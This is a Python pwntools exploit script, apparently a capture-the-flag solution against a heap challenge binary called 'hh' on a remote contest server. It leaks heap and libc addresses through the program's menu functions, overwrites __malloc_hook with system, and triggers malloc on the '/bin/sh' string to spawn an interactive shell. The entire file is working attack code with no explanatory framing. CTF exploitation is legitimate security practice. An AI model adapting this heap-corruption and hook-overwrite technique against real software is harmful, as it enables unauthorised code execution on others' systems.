from pwn import *

def gen_num(n):
	#  0  1  0  1  0  0  0  0
	# wa wi wa wi wa wa wa wa

	#    01 01 00 00
	# wi wi wi wa wa

	#ret = "wi"
	ret = ""
	cnt = 0

	temp = bin(n)[2:]
	temp = '0'*(len(temp)%2) + temp

	i = 0
	while i < len(temp):
		if temp[i] == "0":
			ret += "wa"
		else:
			ret += "wi"
		i += 1

	return ret + "\x00" * (128 - len(ret))

def malloc(size, trigger=False):
	r.send("whaa!" + "\x0a")
	print r.recv()

	r.sendline(gen_num(size))

	if trigger:
		r.interactive()
		exit()

	print r.recv()

def leak(index):
	r.send("mommy?" + "\x0a")

	r.sendline(gen_num(index))
	data = r.recv()

	print data, data.encode("hex")
	return data

def edit(index, msg):
	r.send("<spill>" + "\x0a")
	print r.recv()

	r.sendline(gen_num(index))
	print r.recv()

	r.send(msg + "\x0a")
	print r.recv()

def free(index):
	r.send("NOM-NOM" + "\x0a")
	r.sendline(gen_num(index))
	print r.recv()

def my_leak(addr, size, title=""):
	print "*** {} : {} ***".format(hex(addr), title)
	print r.hexdump(addr, size, begin=addr, skip=False)

import sys

r = None

server = "flatearth.fluxfingers.net"
port = 1743

DEBUG = 0

if len(sys.argv) == 2:
	r = process("./hh")
	DEBUG = 1
else:
	r = remote(server, port)

print r.recvuntil("NOM-NOM\n")

# happa : 0x100203010
happa = 0x100203010

# heap leak
# libc leak
# calculate libc - heap
# overwite __malloc_hook as one_shot
# malloc (trigger)

malloc(0x20)
malloc(0x20)
malloc(0x20)

free(0x20)
free(0x50)

ret = leak(0x50)

ret = ret.split("darling: ")[1].split("\n")[0]
heap = u64(ret.ljust(8, "\x00")) - 0x20

#if DEBUG == 1:
#	heap += 0x100000000

print "heap : ", hex(heap)

free(0x80)

malloc(0x100)
malloc(0x100)

free(0xb0)

ret = leak(0xb0)
ret = ret.split("darling: ")[1].split("\n")[0]
libc_base = u64(ret.ljust(8, "\x00")) - 0x3c4b78

''' local info '''
one_shot      = libc_base + 0x4526a
system        = libc_base + 0x45390
__malloc_hook = libc_base + 0x3c4b10
__free_hook   = libc_base + 0x3c67a8
__libc_start_main = libc_base + 0x20740
binsh         = libc_base + 0x18cd17

print "libc : ", hex(libc_base)
print "malloc_hook: ", hex(__malloc_hook)
print "binsh : ", hex(binsh)

offset = __malloc_hook - heap - 0x10
offset_binsh = binsh - heap 
print "offset : ", hex(offset)
print "offset (binsh) : ", hex(offset_binsh)

#edit(offset, p64(one_shot))
edit(offset, p64(system))

raw_input()

malloc(binsh, True)


